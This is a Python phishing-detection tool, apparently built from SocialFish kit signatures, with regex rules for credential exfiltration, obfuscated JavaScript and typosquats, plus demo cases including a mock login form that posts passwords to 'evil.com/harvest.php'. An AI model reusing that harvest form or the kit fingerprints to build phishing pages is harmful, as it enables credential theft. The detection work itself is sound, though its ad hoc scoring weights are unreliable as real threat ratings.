#!/usr/bin/env python3
"""
PhishGuard - Phishing Kit Detection Tool
=========================================

Reverse-engineered from SocialFish to detect its signatures and similar phishing kits.

Detection Vectors:
1. HTML/DOM anomalies in cloned pages
2. Form action redirects (credential harvesting)
3. Network traffic patterns (C2 communication)
4. CSS/JS fingerprints from known kits
5. SSL/TLS certificate anomalies
6. Rose Glass coherence analysis of page intent

Author: MacGregor Holding Company
License: MIT
"""

import re
import hashlib
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import html.parser


class ThreatLevel(Enum):
    CLEAN = 0
    SUSPICIOUS = 1
    LIKELY_PHISH = 2
    CONFIRMED_PHISH = 3
    ACTIVE_ATTACK = 4


@dataclass
class IOCSignature:
    """Indicator of Compromise signature"""
    name: str
    pattern: str
    weight: float  # 0.0 to 1.0
    category: str
    description: str


@dataclass
class DetectionResult:
    """Result of phishing analysis"""
    url: str
    threat_level: ThreatLevel
    confidence: float
    matched_signatures: List[IOCSignature]
    anomalies: List[str]
    recommendations: List[str]
    timestamp: datetime = field(default_factory=datetime.now)
    rose_glass_coherence: Optional[Dict] = None

    def to_dict(self) -> Dict:
        return {
            'url': self.url,
            'threat_level': self.threat_level.name,
            'confidence': self.confidence,
            'matched_signatures': [s.name for s in self.matched_signatures],
            'anomalies': self.anomalies,
            'recommendations': self.recommendations,
            'timestamp': self.timestamp.isoformat(),
            'coherence': self.rose_glass_coherence
        }


class SocialFishSignatures:
    """
    IOC signatures reverse-engineered from SocialFish phishing kit.

    SocialFish architecture:
    - Flask backend (Python)
    - SQLite database for credential storage
    - /neptune admin panel
    - Clones sites via BeautifulSoup
    - Captures: url, post data, date, browser, version, OS, IP
    - Mobile controller support (SocialFishMobile)
    """

    # Admin panel signatures
    ADMIN_PATHS = [
        '/neptune',           # SocialFish default admin
        '/admin/index.html',  # Template path
        '/admin/report.html', # Report page
    ]

    # Database schema fingerprints (SQLite)
    DB_SCHEMA_PATTERNS = [
        r'creds.*url.*pdate.*browser.*bversion.*platform.*rip',
        r'SELECT.*FROM\s+creds\s+order\s+by\s+id\s+desc',
    ]

    # Flask route patterns
    FLASK_SIGNATURES = [
        'static_url_path',
        'SEND_FILE_MAX_AGE_DEFAULT',
        'g.db = sqlite3.connect',
    ]

    # Known SocialFish API endpoints
    API_PATTERNS = [
        r'/api/v\d+/attacks',
        r'/api/v\d+/credentials',
        r'tokenapi',
        r'countCreds',
        r'countNotPickedUp',
    ]

    # Credential field names commonly targeted
    CREDENTIAL_FIELDS = [
        'email', 'password', 'passwd', 'pass', 'pwd',
        'username', 'user', 'login', 'signin',
        'credential', 'auth', 'secret',
    ]

    # Social media platform signatures
    PLATFORM_CLONES = {
        'facebook': [
            r'facebook\.com',
            r'fb\.com',
            r'login\.php',
            r'm\.facebook',
        ],
        'google': [
            r'accounts\.google',
            r'signin/v\d+',
            r'gaia',
        ],
        'linkedin': [
            r'linkedin\.com/login',
            r'linkedin\.com/checkpoint',
        ],
        'github': [
            r'github\.com/login',
            r'github\.com/session',
        ],
        'twitter': [
            r'twitter\.com/login',
            r'x\.com/login',
        ],
        'instagram': [
            r'instagram\.com/accounts/login',
        ],
        'microsoft': [
            r'login\.microsoftonline',
            r'login\.live\.com',
        ],
    }


class PhishGuard:
    """
    Main phishing detection engine.

    Uses multi-layer analysis:
    1. URL Analysis - domain, path, query params
    2. HTML Analysis - form actions, hidden fields, DOM anomalies
    3. Network Analysis - redirects, external resources
    4. Kit Fingerprinting - known phishing kit signatures
    5. Coherence Analysis - Rose Glass intent detection
    """

    def __init__(self):
        self.signatures = self._load_signatures()
        self.known_legitimate_domains = self._load_legitimate_domains()

    def _load_signatures(self) -> List[IOCSignature]:
        """Load all IOC signatures"""
        signatures = []

        # SocialFish specific signatures
        signatures.append(IOCSignature(
            name="SOCIALFISH_ADMIN",
            pattern=r'/neptune',
            weight=0.95,
            category="admin_panel",
            description="SocialFish admin panel path detected"
        ))

        signatures.append(IOCSignature(
            name="SOCIALFISH_DB_QUERY",
            pattern=r'SELECT.*FROM\s+creds',
            weight=0.90,
            category="database",
            description="SocialFish credential database query pattern"
        ))

        # Generic phishing signatures
        signatures.append(IOCSignature(
            name="FORM_ACTION_MISMATCH",
            pattern=r'<form[^>]*action=["\'](?!https?://[^"\']*(?:facebook|google|linkedin|github|twitter|instagram|microsoft))',
            weight=0.70,
            category="form_hijack",
            description="Form submits to non-legitimate domain"
        ))

        signatures.append(IOCSignature(
            name="HIDDEN_REDIRECT",
            pattern=r'<input[^>]*type=["\']hidden["\'][^>]*name=["\'](?:redirect|return|next|url)["\']',
            weight=0.60,
            category="redirect",
            description="Hidden redirect field for post-harvest navigation"
        ))

        signatures.append(IOCSignature(
            name="EXTERNAL_CREDENTIAL_POST",
            pattern=r'<form[^>]*method=["\']post["\'][^>]*action=["\']https?://(?!(?:www\.)?(?:facebook|google|linkedin|github|twitter|instagram|microsoft)\.com)',
            weight=0.85,
            category="credential_exfil",
            description="Form posts credentials to external server"
        ))

        signatures.append(IOCSignature(
            name="DATA_EXFIL_ENDPOINT",
            pattern=r'(?:\/api\/|\/collect\/|\/harvest\/|\/grab\/|\/catch\/|\/log\/)',
            weight=0.75,
            category="exfiltration",
            description="Common data exfiltration endpoint pattern"
        ))

        signatures.append(IOCSignature(
            name="IP_GEOLOCATION_HARVEST",
            pattern=r'(?:geoplugin|ipinfo|ipapi|freegeoip|ip-api)',
            weight=0.65,
            category="recon",
            description="IP geolocation service for victim profiling"
        ))

        signatures.append(IOCSignature(
            name="BROWSER_FINGERPRINT",
            pattern=r'(?:navigator\.(userAgent|platform|language)|screen\.(width|height)|canvas\.toDataURL)',
            weight=0.55,
            category="fingerprint",
            description="Browser fingerprinting for victim identification"
        ))

        signatures.append(IOCSignature(
            name="NGROK_TUNNEL",
            pattern=r'(?:ngrok\.io|ngrok\.app|tunnel\.)',
            weight=0.80,
            category="infrastructure",
            description="Ngrok tunnel commonly used for phishing"
        ))

        signatures.append(IOCSignature(
            name="TYPOSQUAT_DOMAIN",
            pattern=r'(?:faceb00k|g00gle|linkedln|instagran|micros0ft|tw1tter)',
            weight=0.90,
            category="domain",
            description="Typosquatting domain detected"
        ))

        return signatures

    def _load_legitimate_domains(self) -> set:
        """Load known legitimate domains"""
        return {
            'facebook.com', 'www.facebook.com', 'm.facebook.com',
            'google.com', 'www.google.com', 'accounts.google.com',
            'linkedin.com', 'www.linkedin.com',
            'github.com', 'www.github.com',
            'twitter.com', 'www.twitter.com', 'x.com',
            'instagram.com', 'www.instagram.com',
            'microsoft.com', 'www.microsoft.com', 'login.microsoftonline.com',
            'login.live.com',
        }

    def analyze_url(self, url: str) -> Dict:
        """Analyze URL for phishing indicators"""
        anomalies = []
        risk_score = 0.0

        parsed = urlparse(url)
        domain = parsed.netloc.lower()
        path = parsed.path.lower()

        # Check for IP address instead of domain
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', domain):
            anomalies.append("IP address used instead of domain name")
            risk_score += 0.6

        # Check for suspicious ports
        if ':' in domain:
            port = domain.split(':')[1]
            if port not in ['80', '443']:
                anomalies.append(f"Non-standard port: {port}")
                risk_score += 0.4

        # Check for typosquatting
        for legit_domain in self.known_legitimate_domains:
            if self._is_typosquat(domain, legit_domain):
                anomalies.append(f"Possible typosquat of {legit_domain}")
                risk_score += 0.8

        # Check for suspicious TLDs
        suspicious_tlds = ['.xyz', '.tk', '.ml', '.ga', '.cf', '.gq', '.top', '.work', '.click']
        for tld in suspicious_tlds:
            if domain.endswith(tld):
                anomalies.append(f"Suspicious TLD: {tld}")
                risk_score += 0.3

        # Check for excessive subdomains (common in phishing)
        subdomain_count = domain.count('.')
        if subdomain_count > 3:
            anomalies.append(f"Excessive subdomains: {subdomain_count}")
            risk_score += 0.4

        # Check for legitimate brand in subdomain (phishing pattern)
        for brand in ['facebook', 'google', 'linkedin', 'github', 'twitter', 'instagram', 'microsoft']:
            if brand in domain and not domain.endswith(f'{brand}.com'):
                anomalies.append(f"Brand '{brand}' used in non-official domain")
                risk_score += 0.7

        # Check path for admin panels
        for admin_path in SocialFishSignatures.ADMIN_PATHS:
            if admin_path in path:
                anomalies.append(f"Phishing kit admin panel path: {admin_path}")
                risk_score += 0.9

        return {
            'domain': domain,
            'path': path,
            'anomalies': anomalies,
            'risk_score': min(risk_score, 1.0)
        }

    def _is_typosquat(self, suspect: str, legitimate: str) -> bool:
        """Check if domain is a typosquat of legitimate domain"""
        # Remove TLD for comparison
        suspect_base = suspect.split('.')[0] if '.' in suspect else suspect
        legit_base = legitimate.split('.')[0] if '.' in legitimate else legitimate

        # Check Levenshtein distance
        if self._levenshtein_distance(suspect_base, legit_base) <= 2:
            if suspect_base != legit_base:
                return True

        # Check for common substitutions
        substitutions = {
            'o': '0', 'l': '1', 'i': '1', 'e': '3',
            'a': '4', 's': '5', 'g': '9', 'b': '8'
        }
        normalized = suspect_base
        for char, sub in substitutions.items():
            normalized = normalized.replace(sub, char)

        if normalized == legit_base and suspect_base != legit_base:
            return True

        return False

    def _levenshtein_distance(self, s1: str, s2: str) -> int:
        """Calculate Levenshtein edit distance"""
        if len(s1) < len(s2):
            return self._levenshtein_distance(s2, s1)

        if len(s2) == 0:
            return len(s1)

        previous_row = range(len(s2) + 1)
        for i, c1 in enumerate(s1):
            current_row = [i + 1]
            for j, c2 in enumerate(s2):
                insertions = previous_row[j + 1] + 1
                deletions = current_row[j] + 1
                substitutions = previous_row[j] + (c1 != c2)
                current_row.append(min(insertions, deletions, substitutions))
            previous_row = current_row

        return previous_row[-1]

    def analyze_html(self, html_content: str, source_url: str = "") -> Dict:
        """Analyze HTML content for phishing indicators"""
        anomalies = []
        matched_sigs = []
        risk_score = 0.0

        html_lower = html_content.lower()

        # Check for form actions
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\']'
        forms = re.findall(form_pattern, html_lower)

        for form_action in forms:
            # Check if form posts to different domain
            if form_action.startswith('http'):
                action_domain = urlparse(form_action).netloc
                source_domain = urlparse(source_url).netloc if source_url else ""

                if action_domain and source_domain and action_domain != source_domain:
                    # Check if it's legitimate
                    if action_domain not in self.known_legitimate_domains:
                        anomalies.append(f"Form posts to external domain: {action_domain}")
                        risk_score += 0.7

        # Check for password fields
        password_fields = re.findall(r'<input[^>]*type=["\']password["\']', html_lower)
        if password_fields:
            anomalies.append(f"Contains {len(password_fields)} password field(s)")
            # Password field alone isn't suspicious, but combined with other factors

        # Check for credential field names
        for field_name in SocialFishSignatures.CREDENTIAL_FIELDS:
            if re.search(rf'name=["\'][^"\']*{field_name}[^"\']*["\']', html_lower):
                # Only flag if suspicious context
                pass

        # Check each signature
        for sig in self.signatures:
            if re.search(sig.pattern, html_content, re.IGNORECASE):
                matched_sigs.append(sig)
                risk_score += sig.weight * 0.5  # Weight contribution
                anomalies.append(f"Matched signature: {sig.name}")

        # Check for hidden iframes
        hidden_iframes = re.findall(r'<iframe[^>]*(?:style=["\'][^"\']*display:\s*none|hidden)[^>]*>', html_lower)
        if hidden_iframes:
            anomalies.append(f"Hidden iframes detected: {len(hidden_iframes)}")
            risk_score += 0.5

        # Check for obfuscated JavaScript
        obfuscation_patterns = [
            r'eval\s*\([^)]*(?:unescape|decodeURIComponent|atob)',
            r'document\.write\s*\([^)]*(?:unescape|decodeURIComponent)',
            r'String\.fromCharCode\s*\([^)]*\)',
            r'\\x[0-9a-f]{2}',
        ]
        for pattern in obfuscation_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                anomalies.append("Obfuscated JavaScript detected")
                risk_score += 0.4
                break

        # Check for data exfiltration patterns
        exfil_patterns = [
            r'new\s+Image\(\)\.src\s*=',  # Pixel tracking for exfil
            r'navigator\.sendBeacon',       # Beacon API
            r'fetch\s*\([^)]*(?:password|credential|login)',
            r'XMLHttpRequest[^;]*(?:password|credential)',
        ]
        for pattern in exfil_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                anomalies.append("Data exfiltration pattern detected")
                risk_score += 0.6
                break

        return {
            'anomalies': anomalies,
            'matched_signatures': matched_sigs,
            'risk_score': min(risk_score, 1.0),
            'form_count': len(forms),
            'password_fields': len(password_fields)
        }

    def analyze_coherence(self, page_content: str, claimed_identity: str = "") -> Dict:
        """
        Rose Glass coherence analysis.

        Legitimate login pages have coherent intent:
        - Ψ (consistency): Branding matches claimed identity
        - ρ (wisdom): Professional implementation
        - q (activation): Appropriate urgency level
        - f (social): Proper trust indicators

        Phishing pages show dimensional fractures:
        - Visual claims vs. actual targets mismatch
        - Urgency manipulation (fear/greed)
        - Trust signal fakery
        """
        coherence = {
            'psi': 1.0,  # Internal consistency
            'rho': 1.0,  # Wisdom/professionalism
            'q': 0.5,    # Activation level
            'f': 1.0,    # Social trust signals
        }
        fractures = []

        # Check for urgency manipulation (q-dimension attack)
        urgency_patterns = [
            r'(?:account|password).*(?:expire|suspend|block|lock)',
            r'(?:verify|confirm).*(?:immediately|now|urgent)',
            r'(?:unusual|suspicious).*(?:activity|login)',
            r'(?:security|safety).*(?:alert|warning|notice)',
            r'(?:limited|expire).*(?:time|offer|access)',
        ]
        urgency_count = 0
        for pattern in urgency_patterns:
            if re.search(pattern, page_content, re.IGNORECASE):
                urgency_count += 1

        if urgency_count > 2:
            coherence['q'] = 0.9  # Artificially elevated
            fractures.append("Excessive urgency manipulation detected (q-dimension attack)")

        # Check for brand consistency (Ψ-dimension)
        if claimed_identity:
            # Check if claimed brand appears consistently
            brand_mentions = len(re.findall(claimed_identity, page_content, re.IGNORECASE))
            if brand_mentions < 2:
                coherence['psi'] = 0.6
                fractures.append(f"Claimed identity '{claimed_identity}' lacks consistent branding")

        # Check for trust signal coherence (f-dimension)
        fake_trust_patterns = [
            r'(?:100%|completely)\s*(?:safe|secure)',
            r'(?:bank|military)\s*(?:grade|level)\s*(?:security|encryption)',
            r'(?:verified|certified)\s*(?:by|with)',
            r'(?:trust|security)\s*(?:badge|seal|logo)',
        ]
        fake_trust_count = sum(1 for p in fake_trust_patterns if re.search(p, page_content, re.IGNORECASE))
        if fake_trust_count > 1:
            coherence['f'] = 0.5
            fractures.append("Excessive trust signal injection (f-dimension manipulation)")

        # Check for professional implementation (ρ-dimension)
        amateur_patterns = [
            r'(?:click\s*here|enter\s*details)',
            r'(?:dear\s*user|dear\s*customer)',
            r'(?:kindly|please\s*kindly)',
        ]
        amateur_count = sum(1 for p in amateur_patterns if re.search(p, page_content, re.IGNORECASE))
        if amateur_count > 1:
            coherence['rho'] = 0.6
            fractures.append("Amateur implementation patterns detected")

        # Calculate overall coherence
        overall = (coherence['psi'] + coherence['rho'] + coherence['q'] + coherence['f']) / 4

        # Detect dimensional fractures (inconsistencies between dimensions)
        # High q (urgency) + low psi (consistency) = manipulation
        if coherence['q'] > 0.7 and coherence['psi'] < 0.7:
            fractures.append("DIMENSIONAL FRACTURE: High urgency with inconsistent branding")

        # High f (trust signals) + low rho (professionalism) = fakery
        if coherence['f'] > 0.8 and coherence['rho'] < 0.7:
            fractures.append("DIMENSIONAL FRACTURE: Trust signals contradict implementation quality")

        return {
            'dimensions': coherence,
            'overall_coherence': overall,
            'fractures': fractures,
            'is_authentic': overall > 0.75 and len(fractures) == 0
        }

    def analyze(self, url: str, html_content: str = "", claimed_identity: str = "") -> DetectionResult:
        """
        Full phishing analysis pipeline.

        Returns comprehensive detection result with threat level,
        confidence, and recommendations.
        """
        all_anomalies = []
        all_signatures = []

        # URL Analysis
        url_analysis = self.analyze_url(url)
        all_anomalies.extend(url_analysis['anomalies'])

        # HTML Analysis (if provided)
        html_analysis = {'risk_score': 0, 'anomalies': [], 'matched_signatures': []}
        if html_content:
            html_analysis = self.analyze_html(html_content, url)
            all_anomalies.extend(html_analysis['anomalies'])
            all_signatures.extend(html_analysis['matched_signatures'])

        # Coherence Analysis
        coherence_analysis = None
        if html_content:
            coherence_analysis = self.analyze_coherence(html_content, claimed_identity)
            all_anomalies.extend(coherence_analysis['fractures'])

        # Calculate overall risk
        risk_score = (
            url_analysis['risk_score'] * 0.3 +
            html_analysis['risk_score'] * 0.5 +
            (1 - coherence_analysis['overall_coherence'] if coherence_analysis else 0) * 0.2
        )

        # Determine threat level
        if risk_score < 0.2:
            threat_level = ThreatLevel.CLEAN
        elif risk_score < 0.4:
            threat_level = ThreatLevel.SUSPICIOUS
        elif risk_score < 0.6:
            threat_level = ThreatLevel.LIKELY_PHISH
        elif risk_score < 0.8:
            threat_level = ThreatLevel.CONFIRMED_PHISH
        else:
            threat_level = ThreatLevel.ACTIVE_ATTACK

        # Generate recommendations
        recommendations = self._generate_recommendations(
            threat_level, all_anomalies, all_signatures
        )

        return DetectionResult(
            url=url,
            threat_level=threat_level,
            confidence=min(risk_score * 1.2, 1.0),  # Slight confidence boost
            matched_signatures=all_signatures,
            anomalies=all_anomalies,
            recommendations=recommendations,
            rose_glass_coherence=coherence_analysis
        )

    def _generate_recommendations(
        self,
        threat_level: ThreatLevel,
        anomalies: List[str],
        signatures: List[IOCSignature]
    ) -> List[str]:
        """Generate actionable recommendations based on analysis"""
        recommendations = []

        if threat_level == ThreatLevel.CLEAN:
            recommendations.append("No significant threats detected. Standard security practices apply.")

        elif threat_level == ThreatLevel.SUSPICIOUS:
            recommendations.append("Exercise caution. Verify the URL independently before entering credentials.")
            recommendations.append("Check for valid SSL certificate from trusted authority.")

        elif threat_level == ThreatLevel.LIKELY_PHISH:
            recommendations.append("DO NOT enter any credentials on this page.")
            recommendations.append("Report this URL to your security team or IT department.")
            recommendations.append("If you've already entered credentials, change them immediately.")

        elif threat_level.value >= ThreatLevel.CONFIRMED_PHISH.value:
            recommendations.append("CONFIRMED PHISHING ATTEMPT - Do not interact with this page.")
            recommendations.append("Report to: Google Safe Browsing, PhishTank, VirusTotal")
            recommendations.append("If credentials were entered: Change passwords, enable 2FA, monitor accounts")
            recommendations.append("Preserve evidence: Screenshot the page and save the URL")

        # Add signature-specific recommendations
        for sig in signatures:
            if sig.category == "admin_panel":
                recommendations.append(f"Phishing kit admin panel detected ({sig.name}) - Report to hosting provider")
            elif sig.category == "credential_exfil":
                recommendations.append("Active credential harvesting detected - Block this domain at network level")

        return recommendations


class NetworkAnalyzer:
    """
    Network-level phishing detection.

    Analyzes:
    - DNS records (fresh domains, bulletproof hosting)
    - SSL certificates (self-signed, mismatch, short validity)
    - HTTP headers (server fingerprints, redirects)
    - Traffic patterns (C2 communication)
    """

    @staticmethod
    def analyze_ssl_certificate(cert_info: Dict) -> Dict:
        """Analyze SSL certificate for phishing indicators"""
        anomalies = []
        risk_score = 0.0

        # Check for self-signed
        if cert_info.get('self_signed', False):
            anomalies.append("Self-signed certificate")
            risk_score += 0.6

        # Check certificate age
        issued = cert_info.get('not_before')
        if issued:
            age_days = (datetime.now() - issued).days
            if age_days < 7:
                anomalies.append(f"Certificate issued {age_days} days ago (very new)")
                risk_score += 0.5
            elif age_days < 30:
                anomalies.append(f"Certificate issued {age_days} days ago (new)")
                risk_score += 0.3

        # Check for Let's Encrypt (common for phishing due to free/easy)
        issuer = cert_info.get('issuer', '')
        if "let's encrypt" in issuer.lower():
            anomalies.append("Let's Encrypt certificate (common for phishing)")
            risk_score += 0.2  # Not definitive, but correlates

        # Check for domain mismatch
        cert_domains = cert_info.get('domains', [])
        requested_domain = cert_info.get('requested_domain', '')
        if requested_domain and requested_domain not in cert_domains:
            anomalies.append(f"Certificate domain mismatch: {requested_domain} not in {cert_domains}")
            risk_score += 0.8

        return {
            'anomalies': anomalies,
            'risk_score': min(risk_score, 1.0)
        }

    @staticmethod
    def analyze_headers(headers: Dict) -> Dict:
        """Analyze HTTP headers for phishing indicators"""
        anomalies = []
        risk_score = 0.0

        # Check for server fingerprints
        server = headers.get('Server', '').lower()

        # SocialFish uses Flask/Werkzeug
        if 'werkzeug' in server or 'python' in server:
            anomalies.append("Python/Flask server detected (common for phishing kits)")
            risk_score += 0.3

        # Check for suspicious redirects
        if headers.get('Location'):
            anomalies.append(f"Redirect detected: {headers['Location']}")
            # Analyze redirect target separately

        # Check for missing security headers (legitimate sites have these)
        security_headers = [
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
        ]
        missing = [h for h in security_headers if h not in headers]
        if len(missing) >= 3:
            anomalies.append(f"Missing security headers: {missing}")
            risk_score += 0.3

        return {
            'anomalies': anomalies,
            'risk_score': min(risk_score, 1.0)
        }


def main():
    """Demo the PhishGuard detector"""

    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                      🛡️  PhishGuard  🛡️                       ║
    ║        SocialFish Detection & Phishing Kit Analyzer          ║
    ║                                                               ║
    ║  Reverse-engineered from SocialFish to detect its patterns   ║
    ║  Rose Glass coherence analysis for intent detection          ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    guard = PhishGuard()

    # Test cases
    test_cases = [
        {
            'name': 'Legitimate Google',
            'url': 'https://accounts.google.com/signin',
            'html': '<form action="https://accounts.google.com/v3/signin" method="post"><input type="password" name="password"></form>',
            'identity': 'google'
        },
        {
            'name': 'Typosquat Attack',
            'url': 'https://faceb00k-login.xyz/verify',
            'html': '<form action="https://evil.com/harvest.php" method="post"><input type="password" name="pass"><input type="hidden" name="redirect" value="facebook.com"></form>',
            'identity': 'facebook'
        },
        {
            'name': 'SocialFish Instance',
            'url': 'http://192.168.1.100:5000/neptune',
            'html': '<div>SocialFish Admin Panel</div><script>fetch("/api/v1/credentials")</script>',
            'identity': ''
        },
        {
            'name': 'Urgency Manipulation',
            'url': 'https://secure-verify-account.tk/login',
            'html': '''
                <h1>Your Account Will Be Suspended!</h1>
                <p>URGENT: Verify your account immediately to prevent suspension.</p>
                <p>Unusual activity detected. Confirm your identity now!</p>
                <p>This is your FINAL WARNING. Act now or lose access.</p>
                <form action="/harvest" method="post">
                    <p>100% Safe and Secure - Bank Grade Security</p>
                    <input type="password" name="password">
                </form>
            ''',
            'identity': 'bank'
        },
    ]

    for test in test_cases:
        print(f"\n{'='*60}")
        print(f"Testing: {test['name']}")
        print(f"URL: {test['url']}")
        print(f"{'='*60}")

        result = guard.analyze(
            url=test['url'],
            html_content=test['html'],
            claimed_identity=test['identity']
        )

        print(f"\n🎯 Threat Level: {result.threat_level.name}")
        print(f"📊 Confidence: {result.confidence:.1%}")

        if result.anomalies:
            print("\n⚠️  Anomalies Detected:")
            for anomaly in result.anomalies:
                print(f"   • {anomaly}")

        if result.matched_signatures:
            print("\n🔍 Matched Signatures:")
            for sig in result.matched_signatures:
                print(f"   • {sig.name}: {sig.description}")

        if result.rose_glass_coherence:
            print("\n🌹 Rose Glass Coherence Analysis:")
            dims = result.rose_glass_coherence['dimensions']
            print(f"   Ψ (Consistency): {dims['psi']:.2f}")
            print(f"   ρ (Professionalism): {dims['rho']:.2f}")
            print(f"   q (Activation): {dims['q']:.2f}")
            print(f"   f (Trust Signals): {dims['f']:.2f}")
            print(f"   Overall: {result.rose_glass_coherence['overall_coherence']:.2f}")

            if result.rose_glass_coherence['fractures']:
                print("\n   ⚡ Dimensional Fractures:")
                for fracture in result.rose_glass_coherence['fractures']:
                    print(f"      • {fracture}")

        print("\n📋 Recommendations:")
        for rec in result.recommendations:
            print(f"   → {rec}")


if __name__ == "__main__":
    main()
